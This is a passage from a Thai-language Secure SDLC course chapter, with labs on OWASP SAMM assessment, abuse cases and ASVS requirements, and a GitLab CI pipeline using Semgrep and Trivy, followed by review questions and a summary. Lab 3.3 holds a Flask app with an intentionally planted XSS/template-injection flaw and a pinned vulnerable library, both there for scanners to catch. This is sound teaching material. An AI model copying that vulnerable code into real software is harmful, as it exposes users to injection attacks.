"SecureTech Solutions" เป็นบริษัทพัฒนาซอฟต์แวร์ขนาดกลาง (พนักงาน 200 คน) ที่ผลิต Web Application สำหรับธนาคาร ปัจจุบันบริษัทมี Secure SDLC ในระดับพื้นฐาน:
- มี Security Training ปีละ 1 ครั้ง (แต่ Developer ไม่ค่อยสนใจ)
- ไม่มีการทำ Threat Modeling
- มี SAST (SonarQube) ใน CI/CD แต่ Developer มัก Ignore Warning
- ไม่มี DAST หรือ Penetration Testing
- มีการทำ Code Review แต่ไม่เน้น Security
- ไม่มี Incident Response Plan
- Patch Management ทำแบบไม่เป็นทางการ

**ขั้นตอน:**

1. **ดาวน์โหลด SAMM Toolbox:**
   - ไปที่ https://owaspsamm.org/toolbox/
   - ดาวน์โหลด SAMM Toolbox (Excel หรือ Online)
   - หรือใช้ SAMM Online Assessment

2. **ประเมิน SecureTech Solutions:**
   - ประเมินทั้ง 5 Business Functions (Governance, Design, Implementation, Verification, Operations)
   - แต่ละ Practice ให้คะแนน 0–3 ตามสถานการณ์ที่กำหนด
   - **ตัวอย่างการให้คะแนน:**
     - Education & Guidance: Level 1 (มี Training ปีละครั้ง แต่ไม่ Effective)
     - Threat Assessment: Level 0 (ไม่มีการทำ Threat Modeling)
     - Security Testing: Level 0 (ไม่มี DAST/Pen Test)
     - Incident Management: Level 0 (ไม่มี IR Plan)

3. **สร้าง Radar Chart:**
   - พล็อตคะแนนของทั้ง 15 Practices
   - ระบุจุดอ่อน (Practices ที่ได้คะแนนต่ำ)

4. **กำหนด Target:**
   - กำหนด Maturity Level เป้าหมายที่ต้องการในอีก 1 ปี (Realistic)
   - กำหนดเป้าหมายในอีก 3 ปี (Aspirational)

5. **จัดทำ Roadmap:**
   - แบ่งเป็น Phase (Phase ละ 3–4 เดือน)
   - ระบุกิจกรรมที่ต้องทำในแต่ละ Phase
   - ระบุ Resource ที่ต้องใช้ (คน, เครื่องมือ, งบประมาณ)
   - ระบุ KPI ที่ใช้วัดความสำเร็จ

**ตัวอย่าง Roadmap:**
| Phase | กิจกรรม | Resource |
|-------|---------|----------|
| Q1 2026 | จัด Security Training (OWASP Top 10 + Secure Coding) | $5,000 |
| Q1 2026 | ติดตั้ง SonarQube Quality Gate — Fail Build ถ้า Security Hotspot | ฟรี (Open Source) |
| Q2 2026 | สร้าง Threat Modeling Process (ใช้ OWASP Threat Dragon) | ฟรี (Open Source) |
| Q2 2026 | นำ Trivy เข้า CI/CD สำหรับ Dependency Scanning | ฟรี (Open Source) |
| Q3 2026 | จ้าง Penetration Testing Firm ทำ Assessment ปีละ 1 ครั้ง | $30,000/ปี |
| Q3 2026 | สร้าง Incident Response Plan และซ้อม Tabletop Exercise | Internal |
| Q4 2026 | นำ OWASP ZAP สำหรับ DAST เข้า CI/CD Pipeline | ฟรี (Open Source) |

**สิ่งที่ต้องส่ง:**
1. SAMM Assessment Score (Radar Chart หรือตาราง)
2. Gap Analysis — เปรียบเทียบ Current State vs Target State
3. Roadmap (3–4 Phases) พร้อมคำอธิบายเหตุผลในการเลือก Priority

---

### Lab 3.2: Security Requirements + Abuse Cases สำหรับระบบจองตั๋วหนังออนไลน์

**วัตถุประสงค์:** เพื่อฝึกกำหนด Security Requirements และสร้าง Abuse Cases สำหรับระบบจริง

**เวลาที่ใช้:** 45–60 นาที

**โจทย์:**
"CineTicket" เป็นระบบจองตั๋วหนังออนไลน์ที่กำลังจะถูกพัฒนา โดยมีฟังก์ชันดังนี้:
- สมัครสมาชิก / Login
- ดูโปรแกรมหนังและรอบฉาย
- เลือกที่นั่ง (จากผังที่นั่ง Real-time)
- ชำระเงินด้วยบัตรเครดิต / Mobile Banking
- รับ E-Ticket (QR Code)
- ยกเลิกการจอง (ภายใน 2 ชั่วโมงก่อนฉาย)
- Admin: จัดการรอบฉาย, ราคา, โปรโมชัน
- Admin: ดูรายงานยอดขาย

**ขั้นตอน:**

**ส่วนที่ 1: สร้าง Abuse Cases**

| ลำดับ | Use Case ปกติ | Abuse Case | ผลกระทบ |
|------|---------------|------------|---------|
| 1 | ผู้ใช้เลือกที่นั่ง | ผู้โจมตีจองที่นั่งทั้งหมดโดยไม่จ่ายเงิน (Block Seat) | ผู้ใช้จริงจองตั๋วไม่ได้ |
| 2 | ผู้ใช้ Login | ผู้โจมตี Brute Force Password | บัญชีผู้ใช้ถูกลักลอบใช้ |
| 3 | | | |
| 4 | | | |
| 5 | | | |

ให้นักศึกษาเพิ่ม Abuse Cases อย่างน้อย 5 รายการ พร้อม:
- ระบุภัยคุกคาม (STRIDE — Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege)
- ระบุระดับความเสี่ยง (High / Medium / Low)
- กำหนด Security Requirement เพื่อป้องกัน

**ส่วนที่ 2: กำหนด Security Requirements**

ใช้ OWASP ASVS (Application Security Verification Standard) เป็นแนวทาง:

| หมวดหมู่ (ASVS) | Security Requirement | ระดับ (L1/L2/L3) |
|-----------------|---------------------|------------------|
| V2 Authentication | ระบบต้อง Lockout Account หลังจาก Login ล้มเหลว 5 ครั้ง | L1 |
| V3 Session Management | Session Token ต้องหมดอายุหลังจาก Logout หรือไม่ใช้งาน 30 นาที | L1 |
| V4 Access Control | ผู้ใช้สามารถดูได้เฉพาะประวัติการจองของตนเองเท่านั้น | L1 |
| V8 Data Protection | ข้อมูลบัตรเครดิตต้องถูกเข้ารหัส (AES-256) หรือใช้ Tokenization | L2 |
| V11 Business Logic | ต้องตรวจสอบว่าที่นั่งที่เลือกยังว่างอยู่ก่อนยืนยันการจอง | L2 |

ให้นักศึกษาเพิ่ม Security Requirements อย่างน้อย 5 รายการ

**ส่วนที่ 3: เขียน Security Stories (2 Stories)**

เขียนเป็น User Story ในรูปแบบ:

```
ในฐานะ [บทบาท]
ฉันต้องการ [ฟังก์ชัน]
เพื่อให้ [คุณค่าทางความปลอดภัย]

Acceptance Criteria:
1. [เงื่อนไข]
2. [เงื่อนไข]
3. [เงื่อนไข]
```

**ตัวอย่าง:**
```
ในฐานะ ผู้ใช้ระบบ
ฉันต้องการให้ระบบบันทึก Audit Log ทุกครั้งที่มีการยกเลิกการจอง
เพื่อให้สามารถตรวจสอบย้อนหลังได้ว่าผู้ใช้ยกเลิกการจองจริง

Acceptance Criteria:
1. ทุกการยกเลิกการจองถูกบันทึก (Timestamp, User ID, Order ID, เหตุผล)
2. Audit Log ไม่สามารถแก้ไขหรือลบโดยผู้ใช้ทั่วไป
3. Admin สามารถค้นหาและดู Audit Log ได้ผ่าน Admin Dashboard
```

**สิ่งที่ต้องส่ง:**
1. Abuse Case Table อย่างน้อย 5 รายการ (พร้อม STRIDE Classification + Risk Level)
2. Security Requirements Table อย่างน้อย 5 รายการ (พร้อม ASVS Reference)
3. Security Stories 2 เรื่อง (ในรูปแบบ User Story + Acceptance Criteria)

---

### Lab 3.3: GitLab CI/CD Pipeline with SAST (Semgrep) + SCA (Trivy)

**วัตถุประสงค์:** เพื่อฝึกสร้าง CI/CD Pipeline ที่มี Security Testing Stage ด้วยเครื่องมือ Open Source

**เวลาที่ใช้:** 60–90 นาที

**ข้อกำหนดเบื้องต้น:**
- มี GitLab Account (หรือ GitHub Account ที่สามารถใช้ GitHub Actions ได้)
- เข้าใจพื้นฐานของ CI/CD Pipeline
- (Optional) มี Docker ติดตั้งในเครื่อง

**ขั้นตอน:**

**ส่วนที่ 1: สร้าง Project และเตรียม Source Code**

1. สร้าง New Project ใน GitLab
2. สร้าง Web Application แบบง่าย (เลือกภาษาใดก็ได้ — Python/Node.js/Java)
3. เพิ่ม Dependency ที่มี Known Vulnerability (เพื่อทดสอบ SCA):
   - Python: เพิ่ม `requests==2.20.0` (มีช่องโหว่ CVE-2018-18074)
   - หรือใช้ Library เวอร์ชันเก่าที่มี CVE

**ตัวอย่าง Python Web App (app.py):**
```python
from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <html>
    <head><title>CineTicket</title></head>
    <body>
        <h1>Welcome to CineTicket</h1>
        <form action="/search" method="GET">
            <input type="text" name="movie" placeholder="Search movies...">
            <input type="submit" value="Search">
        </form>
    </body>
    </html>
    '''

@app.route('/search')
def search():
    # Intentional vulnerability: XSS
    movie = request.args.get('movie', '')
    return render_template_string(f'<h1>Search results for: {movie}</h1>')

if __name__ == '__main__':
    app.run(debug=True)
```

**requirements.txt (มี Known Vulnerability):**
```
flask==2.0.1
requests==2.20.0  # CVE-2018-18074
```

**Dockerfile:**
```dockerfile
FROM python:3.9-alpine
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
EXPOSE 5000
CMD ["python", "app.py"]
```

**ส่วนที่ 2: สร้าง .gitlab-ci.yml**

```yaml
stages:
  - test
  - security

variables:
  PIP_CACHE_DIR: "$CI_PROJECT_DIR/.cache/pip"

cache:
  paths:
    - .cache/pip

# Stage 1: Unit Test
unit-test:
  stage: test
  image: python:3.9-alpine
  script:
    - pip install pytest
    - pytest || true  # ไม่ Fail ถ้ายังไม่มี Test

# Stage 2: SAST with Semgrep
sast:
  stage: security
  image: returntocorp/semgrep:latest
  script:
    - semgrep --config=auto --error .
  artifacts:
    reports:
      sast: gl-sast-report.json
    paths:
      - gl-sast-report.json

# Stage 3: SCA with Trivy (Dependency Scanning)
dependency-scan:
  stage: security
  image: docker:latest
  services:
    - docker:dind
  script:
    - apk add --no-cache curl
    - curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh
    - ./bin/trivy fs --format gitlab --output gl-sca-report.json --severity CRITICAL,HIGH .
  artifacts:
    reports:
      dependency_scanning: gl-sca-report.json
    paths:
      - gl-sca-report.json

# Stage 4: Container Image Scan
container-scan:
  stage: security
  image: docker:latest
  services:
    - docker:dind
  script:
    - docker build -t cineticket:$CI_COMMIT_SHORT_SHA .
    - apk add --no-cache curl
    - curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh
    - ./bin/trivy image --severity CRITICAL,HIGH --exit-code 1 cineticket:$CI_COMMIT_SHORT_SHA
  artifacts:
    reports:
      container_scanning: gl-container-scanning-report.json
```

**ส่วนที่ 3: Push Code และดูผลลัพธ์**

1. Push โค้ดไปยัง GitLab Repository
2. ดู Pipeline ใน GitLab CI/CD → Pipelines
3. สังเกตผลลัพธ์ของแต่ละ Job:
   - **SAST:** Semgrep ควรพบ XSS Vulnerability (CWE-79) ใน `app.py` บรรทัด `/search`
   - **SCA:** Trivy ควรรายงาน Known Vulnerability ใน `requests==2.20.0` (CVE-2018-18074)
   - **Container Scan:** Trivy ควรรายงาน Vulnerabilities ใน Base Image

**ส่วนที่ 4: แก้ไขและ Push อีกครั้ง**

1. แก้ไขช่องโหว่ XSS ใน `app.py` — ใช้ `render_template_string` อย่างปลอดภัยหรือหลีกเลี่ยง
2. อัปเดต `requests==2.31.0` (เวอร์ชันล่าสุดที่ไม่มี Known Critical Vulnerability)
3. Push อีกครั้งและดูว่า Pipeline ผ่านหรือไม่

**สิ่งที่ต้องส่ง:**
1. ไฟล์ `.gitlab-ci.yml` ที่สมบูรณ์
2. ภาพหน้าจอ (Screenshot) Pipeline ที่ทำงาน — แสดง SAST, SCA, Container Scan Results
3. ภาพหน้าจอ Security Report ใน GitLab — แสดง Findings ที่ตรวจพบ
4. คำอธิบาย:
   - Semgrep พบช่องโหว่อะไร (CWE, Description)
   - Trivy พบ Known Vulnerabilities อะไร (CVE, Severity)
   - วิธีแก้ไขแต่ละช่องโหว่

---

## คำถามท้ายบท

1. แนวคิด Shift Left Security คืออะไร จงอธิบายความสำคัญพร้อมยกตัวอย่างต้นทุนในการแก้ไขข้อบกพร่องในแต่ละขั้นของ SDLC (อ้างอิง IBM Systems Sciences Institute หรือ NASA) และอธิบายว่าทำไมต้นทุนจึงเพิ่มขึ้นแบบทวีคูณ

2. เปรียบเทียบโมเดล Secure SDLC ทั้ง 3 โมเดล (Microsoft SDL, OWASP SAMM, NIST SSDF SP 800-218) ในด้าน: (ก) โครงสร้าง/จำนวนขั้นตอน, (ข) จุดประสงค์หลักของโมเดล, (ค) ความเหมาะสมกับองค์กรแต่ละประเภท, และ (ง) วิธีการวัดผลความสำเร็จ

3. จงอธิบายความแตกต่างระหว่าง Security Debt และ Technical Debt พร้อมยกตัวอย่าง Security Debt ที่เกิดขึ้นในองค์กรพัฒนา ซอฟต์แวร์ อย่างน้อย 3 ตัวอย่าง และอธิบายว่า Security Debt มี "ดอกเบี้ย" ในรูปแบบใดบ้าง

4. STRIDE คืออะไร จงอธิบายภัยคุกคามทั้ง 6 ประการ พร้อมยกตัวอย่างการโจมตีในแต่ละประเภท และมาตรการป้องกัน สำหรับระบบ E-Commerce

5. จงอธิบายความแตกต่างและความสัมพันธ์ระหว่าง SAST, DAST, SCA, และ Penetration Testing — แต่ละแบบตรวจสอบอะไร พบช่องโหว่ประเภทใด และควรรวมเข้าในขั้นตอนใดของ SDLC พร้อมยกตัวอย่างเครื่องมืออย่างน้อยแบบละ 2 เครื่องมือ

6. หากนักศึกษาเป็น Security Architect ของธนาคารแห่งหนึ่งที่ต้องการนำแนวคิด DevSecOps มาใช้ จงอธิบายว่า Security Tools ใดบ้างที่ควรบูรณาการใน CI/CD Pipeline (ตั้งแต่ Commit → Build → Test → Deploy) และแต่ละ Tool ป้องกันการโจมตีแบบใด

7. จงอธิบายแนวคิด "Policy as Code" และ "Compliance as Code" พร้อมยกตัวอย่างเครื่องมือและภาษาในการเขียน Policy (OPA/Rego, Sentinel) และอธิบายว่าแนวคิดนี้ช่วยให้องค์กรปฏิบัติตามกฎหมาย (PDPA/GDPR) ได้อย่างไร

8. จากกรณีศึกษา SolarWinds (2020) จงวิเคราะห์ว่าความล้มเหลวใน Secure SDLC ในขั้นตอนใดบ้างที่ทำให้เกิดการโจมตี — และเสนอแนวทางป้องกันโดยอ้างอิง NIST SSDF (SP 800-218) หรือ OWASP SAMM

9. จงเปรียบเทียบการปรับใช้ Secure SDLC ในรูปแบบ Waterfall vs Agile — อะไรคือความท้าทายในการปรับใช้ Secure SDLC ใน Agile และแนวทางแก้ไข (เช่น Security Stories, Security Acceptance Criteria, Security Sprint)

10. "Container Security" ครอบคลุมประเด็นอะไรบ้าง (Image Security, Runtime Protection, Registry Security) จงอธิบายแต่ละด้านพร้อมยกตัวอย่างเครื่องมือและแนวปฏิบัติที่ดี อย่างน้อยด้านละ 2 ข้อ

---

## สรุปท้ายบท

Secure Software Development Lifecycle (SDLC) เป็นแนวทางในการบูรณาการความปลอดภัยเข้าไปในทุกขั้นตอนของกระบวนการพัฒนาซอฟต์แวร์ แทนที่จะปล่อยให้ความปลอดภัยเป็นสิ่งที่มากตรวจสอบทีหลัง ("Shift Left Security") แนวคิดนี้มีรากฐานมาจากหลักการทางวิศวกรรมที่ว่าต้นทุนในการแก้ไขข้อบกพร่องเพิ่มขึ้นแบบทวีคูณตามขั้นตอนของ SDLC — การแก้ไขในช่วง Production มีต้นทุนสูงกว่าการแก้ไขในช่วง Requirements ถึง 100 เท่าขึ้นไป (IBM Systems Sciences Institute, NASA)

โมเดล Secure SDLC ที่สำคัญมี 3 โมเดลหลัก ได้แก่ Microsoft SDL (7 ขั้นตอน — เน้น Process ที่ชัดเจน), OWASP SAMM (5 Business Functions, 15 Practices — เน้นการประเมินวุฒิภาวะและการวางแผนปรับปรุง), และ NIST SSDF SP 800-218 (4 Groups, 19 Practices — เน้น Outcome-Based Approach และสอดคล้องกับ Executive Order 14028) แต่ละโมเดลมีจุดเด่นแตกต่างกัน — องค์กรสามารถเลือกใช้หรือผสมผสานตามความเหมาะสม

กิจกรรมด้านความปลอดภัยในแต่ละขั้นของ SDLC ครอบคลุมตั้งแต่:
- **Requirements:** Security Requirements Engineering, Abuse Cases, Security Stories, Security Acceptance Criteria
- **Design:** Threat Modeling (STRIDE), Secure Design Principles, Attack Surface Analysis, Architecture Review
- **Implementation:** Secure Coding Standards (CERT, OWASP ASVS), SAST (Semgrep, SonarQube), Secure Code Review
- **Testing:** DAST (OWASP ZAP), Penetration Testing (Black/Grey/White Box), Fuzz Testing, SCA/Dependency Scanning (Trivy, Snyk)
- **Deployment:** Security Configuration Review, Infrastructure Scanning, Container Image Scanning
- **Operations:** Incident Response Plan, Patch Management, Vulnerability Management Lifecycle, Continuous Monitoring

แนวคิด DevSecOps ทำให้ Security เป็นส่วนหนึ่งของ Pipeline การพัฒนา — ผ่าน Security as Code, Policy as Code (OPA/Rego), Compliance as Code, IaC Security (Checkov/tfsec), และ Container Security (Image Scanning + Runtime Protection ด้วย Falco/AppArmor) การทำให้ความปลอดภัยทำงานอัตโนมัติใน CI/CD Pipeline ช่วยให้องค์กรสามารถพัฒนาซอฟต์แวร์ได้รวดเร็วโดยไม่ลดทอนความปลอดภัย

กรณีศึกษาในบทนี้ — Equifax (Patch Management Failure), Codecov (CI/CD Supply Chain Attack), Capital One (DevSecOps Transformation), และ SolarWinds (Build Pipeline Compromise) — สอนบทเรียนสำคัญว่า Secure SDLC ไม่ใช่แค่การมีกระบวนการ แต่ต้องมีการบังคับใช้ (Enforcement) การตรวจสอบ (Verification) และการปรับปรุงอย่างต่อเนื่อง

ท้ายที่สุด ความปลอดภัยของซอฟต์แวร์ไม่ใช่จุดหมายปลายทาง — เป็นการเดินทางที่ต้องปรับตัวอย่างต่อเนื่องตาม Threat Landscape ที่เปลี่ยนแปลงไป และต้องเป็นความรับผิดชอบของทุกคนในทีมพัฒนา ไม่ใช่แค่ Security Team

---
---

## Verification

- **Web searches performed:**
  - IBM Systems Sciences Institute cost of fixing bugs (verified relative cost: requirements=$1, design=$6, coding=$15, testing=$60, deployment=$100+ — cited in Dawson et al., 2010; NASA study 2010 confirms exponential cost growth: 1 unit at requirements → 3–8 at design → 7–16 at build → 21–78 at test → 29–1500+ at operations)
  - Microsoft SDL 7 phases and Continuous SDL (verified against Microsoft Learn docs, MS SDL v5.2 July 2024, Microsoft Security Blog March 2024)
  - OWASP SAMM v2.0 structure (verified 5 Business Functions, 15 Security Practices from owaspsamm.org)
  - NIST SSDF SP 800-218 v1.1 (verified 4 groups, 19 practices from NIST SP 800-218 final Feb 2022)
  - Microsoft SDL results (verified: Windows Server 2003 −63% vulnerabilities vs Win2K; IIS 6.0 = 1 vulnerability; SQL Server 2005 = 0 vulns in 24 months post-SP3 — from MSDN Magazine 2005, ZDNet 2005, Microsoft SDL FAQ)
  - Equifax 2017 (verified: Apache Struts CVE-2017-5638; patch available March 7; happened May 2017; 147M victims; $1.38B minimum cost; House Oversight Committee report Dec 2018)
  - Codecov 2021 (verified: Docker image layer error → GCS key theft → Bash Uploader modified Jan 31–Apr 1, 2021; 29,000+ orgs affected; source: Codecov post-mortem, SecurityWeek, Ars Technica)
  - SolarWinds 2020 (verified: Sep 2019–Dec 2020; SUNBURST backdoor in Orion; 18,000+ orgs; Golden SAML technique; CISA AA20-352A; SolarWinds blog Jan 2021)
  - Capital One DevSecOps (verified: Centrally Orchestrated Pipeline, Qualys integration, 95% assessment coverage; Capital One Tech Blog 2025)
  - OPA 1.0 release (verified: December 2024, CNCF graduated 2021, rego.v1 syntax changes)
  - Edgescan Vulnerability Statistics Report 2024 (verified MTTR data)
  - Cobalt State of Pentesting in Healthcare 2025 (verified: healthcare MTTR for serious findings = 58 days median, 244 days half-life)
  - BSIMM16 (verified: January 2026, 111 organizations, 128 activities across 4 domains; Black Duck)
  - Mean Time to Remediate benchmarks (verified: CISA KEV ≤7 days for federal; Tenable Research 2025; EdgeScan 2024)

- **CVE references verified:**
  - CVE-2017-5638 (Apache Struts RCE) — Equifax
  - CVE-2018-18074 (requests library) — Lab example
  - CVE-2021-44228 (Log4Shell) — Patch management example
  - CVE-2019-8917 (SolarWinds Orion) — Supernova malware

- **Standards citations verified:**
  - NIST SP 800-218 v1.1 (Feb 2022) — SSDF
  - NIST SP 800-53 Rev. 5 — Security controls
  - NIST SP 800-61 Rev. 2 — Incident handling
  - NIST SP 800-115 — Security testing
  - NIST SP 800-190 — Container security
  - ISO 27001:2022 — ISMS
  - OWASP ASVS v4.0 — Application Security Verification Standard
  - OWASP SAMM v2.0 (Jan 2020) — Maturity model
  - OWASP Top 10 2021 — Web vulnerabilities
  - PCI DSS v4.0 — Payment card security
  - EO 14028 (May 2021) — Improving cybersecurity
  - CIS Benchmarks — Configuration hardening
  - CISA KEV Catalog — Known exploited vulnerabilities

- **Status:** All verified — no [UNVERIFIED] items
